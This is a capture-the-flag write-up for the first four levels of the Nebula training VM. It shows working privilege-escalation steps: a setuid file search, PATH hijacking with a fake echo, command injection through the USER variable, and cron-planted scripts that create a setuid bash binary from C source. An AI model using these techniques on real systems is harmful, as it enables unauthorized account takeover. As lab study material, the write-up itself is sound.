# [Nebula](https://exploit.education/nebula/)

## Basics
Nebula VM has 20 levels. Each level can be accessed with `levelXX` username and the same password.

## [Level 00](https://exploit.education/nebula/level-00/)

#### Solution
```bash
find / -type f -user flag00 -perm -0400 2>/dev/null
```
Search for all files, in all directories, belonging to `flag00` user, with [setuid](https://en.wikipedia.org/wiki/Setuid). Redirect all "permission error" (stderr) messages to `/dev/null` discarding those messages.

#### Result
```bash
level00@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn't count
level00@nebula:~$ find / -type f -user flag00 -perm -0400 2>/dev/null
/bin/.../flag00
/home/flag00/.bash_logout
/home/flag00/.bashrc
/home/flag00/.profile
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## [Level01](https://exploit.education/nebula/level-01/)

#### Solution
Program allows to execute arbitrary program due to `system` call for `echo`.
Let's create fake echo with to run `bash` session with `flag01` UID.

#### Result
```bash
level01@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn't count
level01@nebula:~$ cat > /tmp/echo << EOF
> #!/usr/bin/env bash
> bash
> EOF
level01@nebula:~$ chmod +x /tmp/echo
level01@nebula:~$ cd ~flag01/
level01@nebula:/home/flag01$ ./flag01
and now what?
level01@nebula:/home/flag01$ PATH=/tmp:$PATH ./flag01
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
```

## [Level02](https://exploit.education/nebula/level-02/)

#### Solution
Program is reading `USER` variable, which can be provided by attacker.

#### Result
```bash
level02@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn't count
level02@nebula:~$ USER=";bash #" /home/flag02/flag02
about to call system("/bin/echo ;bash # is cool")

flag02@nebula:~$ getflag
You have successfully executed getflag on a target account
```


## [Level03](https://exploit.education/nebula/level-03/)

#### Solution
Cron is running script which is picking up content of `writable.d` directory. It is executing whatever is there. It means, that anything what is running via cron, will have the same permissions.

#### Result
```bash
level03@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn't count
level03@nebula:~$ cd ~flag03
level03@nebula:/home/flag03$ cat > writable.d/flag << EOF
> #!/usr/bin/env bash
> getflag > /tmp/flag.result
> EOF
level03@nebula:/home/flag03$ cat /tmp/flag.result
You have successfully executed getflag on a target account
```

#### Solution2
Prepare simple C program to gain bash access

#### Result2
```C
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
  system("/bin/bash");
}
```
```bash
level03@nebula:/tmp$ cat > /home/flag03/writable.d/exploit.sh << EOF
> #!/usr/bin/env bash
> cp /tmp/exploit /home/flag03/exploitable
> chmod u+s /home/flag03/exploitable
> EOF
```

#### Mistakes
##### First
I tried to create copy of `exploit` program in `/tmp` directory. However, when I tried to run it, it didn't give me `flag03` user. After looking into `/etc/fstab` it became obvious:
```
flag03@nebula:/home/flag03$ cat /etc/fstab
overlayfs / overlayfs rw 0 0
tmpfs /tmp tmpfs nosuid,nodev 0 0
```
`tmpfs` has `nosuid` option. It means, that the nosuid mount option specifies that the filesystem cannot contain set userid files.

##### Second
When I found that `nosetuid` is preventing from running program from within `/tmp`, I decided to copy `exploit` to `/home/level03`. It failed, because default user running `writable.sh` wasn't `root` but `flag03`. Solution was to copy payload to `/home/flag03` directory.
